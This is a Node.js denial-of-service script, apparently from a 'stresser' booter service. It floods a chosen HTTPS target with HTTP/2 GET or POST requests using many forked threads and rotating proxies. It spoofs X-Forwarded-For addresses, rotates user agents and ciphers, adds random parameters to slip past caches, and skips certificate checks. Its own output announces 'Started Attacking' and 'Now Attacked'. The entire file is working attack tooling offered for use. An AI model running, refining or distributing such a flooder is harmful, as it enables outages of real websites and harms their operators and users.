//Stresser.US HTTPS/1 method released by forky and coded by thai friend :D

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring');

var path = require("path");
const cluster = require('cluster');
const http2 = require('http2');

var fileName = __filename;
var file = path.basename(fileName);

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8){
    console.log('HTTP/2 (Support HTTPS Only) | <3 WeAreRainBowHAT');
    console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")');
    //console.log(process.argv.length);
    process.exit(0);
}

let randomparam = false;

var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n');
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach((ss) => {
    if (ss.includes("cookie=") && !process.argv[2].split('""')[0].includes(ss)){
        COOKIES = ss.slice(7);
    } else if (ss.includes("postdata=") && !process.argv[2].split('""')[0].includes(ss)){
        if (process.argv[2].toUpperCase() != "POST"){
            console.error("Method Invalid (Has Postdata But Not POST Method)")
            process.exit(1);
        }
        POSTDATA = ss.slice(9);
    } else if (ss.includes("randomstring=")){
        randomparam = ss.slice(13);
        console.log("(!) RandomString Mode");
    } else if (ss.includes("headerdata=")){
        headerbuilders = {
            "Cache-Control": "max-age=0",
            "Referer":target,
            "X-Forwarded-For":spoof(),
            "Cookie":COOKIES,
            ":method":"GET"
        };
        if (ss.slice(11).split('""')[0].includes("&")) {
            const hddata = ss.slice(11).split('""')[0].split("&");
            for (let i = 0; i < hddata.length; i++) {
                const head = hddata[i].split("=")[0];
                const dat = hddata[i].split("=")[1];
                headerbuilders[head] = dat;
            }
        } else {
            const hddata = ss.slice(11).split('""')[0];
            const head = hddata.split("=")[0];
            const dat = hddata.split("=")[1];
            headerbuilders[head] = dat;
        }
    }
});
if (COOKIES !== undefined){
    console.log("(!) Custom Cookie Mode");
} else {
    COOKIES = "";
}
if (POSTDATA !== undefined){
    console.log("(!) Custom PostData Mode");
} else {
    POSTDATA = "";
}
if (headerbuilders !== undefined){
    console.log("(!) Custom HeaderData Mode");
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }
        console.log("(!) Now Attacked | Method By <3 WeAreRainBowHAT & <3 Felipe")
    
        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
} else {
    headerbuilders = {
        "Cache-Control": "max-age=0",
        "Referer":target,
        "X-Forwarded-For":spoof(),
        "Cookie":COOKIES,
        ":method":"GET"
    }
    if (cluster.isMaster){
        for (let i = 0; i < process.argv[7]; i++){
            cluster.fork();
            console.log(`(!) Threads ${i} Started Attacking`);
        }
        console.log("(!) Now Attacked | Method By <3 WeAreRainBowHAT & <3 Felipe")
    
        setTimeout(() => {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
    const rsdat = randstr.generate({
        "charset":"0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
        "length":4
    });
    return rsdat;
}

const UAs = [
"Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:109.52.179.108]",
"Mozilla/5.0 (Linux; Android 11; CPH2195 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/366.1.0.20.113;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:5.91.42.162]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 [ip:77.32.29.98]",
"Mozilla/5.0 (Linux; Android 10; LM-X430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 [ip:193.207.205.27]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:87.21.179.161]",
"Mozilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; motorola one action) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; it-it; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.4-go",
"Mozilla/5.0 (Linux; Android 10; HMA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:114.122.137.204]",
"Mo1zilla/5.0 (Linux; Android 11; CPH2195 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/366.1.0.20.113;]",
"Mo1zilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:5.91.42.162]",
"Mo1zilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 [ip:77.32.29.98]",
"Mo1zilla/5.0 (Linux; Android 10; LM-X430) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 [ip:193.207.205.27]",
"Mo1zilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:87.21.179.161]",
"Mo1zilla/5.0 (Linux; Android 7.0; HUAWEI VNS-L23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mo1zilla/5.0 (Linux; Android 11; motorola one action) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mo1zilla/5.0 (Linux; U; Android 9; it-it; Redmi 6A Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.4-go",
"Mo1zilla/5.0 (Linux; Android 10; HMA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36 [ip:114.122.137.204]",
"Roku/DVP-11.0 (11.0.0.4193-17)",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/24.0.871.0 Safari/537.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/18.0.825.0 Safari/533.1.0",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5.7; rv:11.1) Gecko/20100101 Firefox/11.1.5",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/19.0.840.0 Safari/538.2.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/13.0.855.0 Safari/535.0.1",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/3.1; .NET CLR 4.1.26233.3)",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/34.0.804.0 Safari/531.2.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/23.0.876.0 Safari/534.0.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/39.0.886.0 Safari/537.1.2",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.2; Trident/4.1; .NET CLR 3.3.29828.9)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/6.0; .NET CLR 3.9.96030.2)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_9 rv:3.0; SQ) AppleWebKit/534.2.0 (KHTML, like Gecko) Version/5.1.1 Safari/534.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/35.0.800.0 Safari/532.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/39.0.817.0 Safari/532.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.0.1 (KHTML, like Gecko) Chrome/33.0.886.0 Safari/534.0.1",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.1; .NET CLR 3.7.96296.4)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/15.0.837.0 Safari/531.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/13.0.867.0 Safari/537.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1)AppleWebKit/535.0.2 (KHTML, like Gecko) Version/4.0.4 Safari/535.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/19.0.810.0 Safari/532.1.1",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/3.1; .NET CLR 4.4.60735.3)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/20.0.884.0 Safari/534.2.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/39.0.860.0 Safari/538.0.0",
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Trident/6.1; .NET CLR 2.9.65729.2)",
"Mozilla/5.0 (Windows NT 5.0; WOW64; rv:7.0) Gecko/20100101 Firefox/7.0.4",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/32.0.889.0 Safari/537.1.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/35.0.803.0 Safari/532.1.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/21.0.846.0 Safari/532.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/24.0.842.0 Safari/538.1.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/531.0.2 (KHTML, like Gecko) Chrome/15.0.848.0 Safari/531.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/14.0.884.0 Safari/535.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/32.0.898.0 Safari/536.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.0.1 (KHTML, like Gecko) Chrome/35.0.886.0 Safari/535.0.1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/33.0.827.0 Safari/537.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/34.0.858.0 Safari/535.2.0",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/20.0.868.0 Safari/538.0.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/23.0.820.0 Safari/538.2.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/36.0.803.0 Safari/536.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/18.0.802.0 Safari/535.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/38.0.862.0 Safari/538.0.1",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_9_4 rv:3.0; FR) AppleWebKit/534.0.1 (KHTML, like Gecko) Version/5.1.10 Safari/534.0.1",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5 rv:2.0; HE) AppleWebKit/532.0.2 (KHTML, like Gecko) Version/5.0.7 Safari/532.0.2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/25.0.830.0 Safari/535.0.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/26.0.800.0 Safari/536.2.2",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_8) AppleWebKit/537.1.0 (KHTML, like Gecko) Chrome/26.0.882.0 Safari/537.1.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/13.0.870.0 Safari/532.1.0",
"Mozilla/5.0 (Windows NT 5.2; WOW64; rv:14.9) Gecko/20100101 Firefox/14.9.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/37.0.839.0 Safari/535.1.2",
"Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/28.0.844.0 Safari/534.0.2",
"Opera/11.6 (X11; Linux x86_64; U; SE Presto/2.9.185 Version/11.00)",
];

function spoof(){
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
}

const cplist = [
    "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
];

function startflood(){

    if (process.argv[2].toUpperCase() == "POST"){
        const tagpage = url.parse(target).path.replace("%RAND%",ra())
        headerbuilders[":method"] = "POST"
        headerbuilders["Content-Type"] = "text/plain"
        if (randomparam) {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];

                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper,
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: `${(url.parse(target).path.includes("%RAND%")) ? tagpage : url.parse(target).path}`,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Body"] = `${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%",ra()) : POSTDATA}`
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else if (process.argv[2].toUpperCase() == "GET") {
        headerbuilders[":method"] = "GET"
        if (randomparam){
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        } else {
            setInterval(() => {

                headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]

                var cipper = cplist[Math.floor(Math.random() * cplist.length)];

                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                proxy = proxy.split(':');
            
                var http = require('http'),
                    tls = require('tls');
                    
                tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
            
                var req = http.request({ 
                    //set proxy session
                    host: proxy[0],
                    port: proxy[1],
                    ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM:TLS13-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384',
                    method: 'CONNECT',
                    path: parsed.host + ":443"
                }, (err) => {
                    req.end();
                    return;
                });
            
                req.on('connect', function (res, socket, head) { 
                    //open raw request
                        const client = http2.connect(parsed.href, {
                            createConnection: () => tls.connect({
                                host: parsed.host,
                                ciphers: cipper, //'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                //sessionTimeout: 5000,
                                socket: socket
                            }, function () {
                                for (let i = 0; i< rate; i++){
                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}`
                                    headerbuilders["X-Forwarded-For"] = spoof();
                                    headerbuilders["Cookie"].replace("%RAND%",ra());
                                    const req = client.request(headerbuilders);
                                    req.end();
                                    req.on("response", () => {
                                        req.close();
                                    })
                                }
                            })
                        });
                    });
                    req.end();
                });
        }
    } else {
        console.log("(!) Method Invalid");
        process.exit(1);
    }

}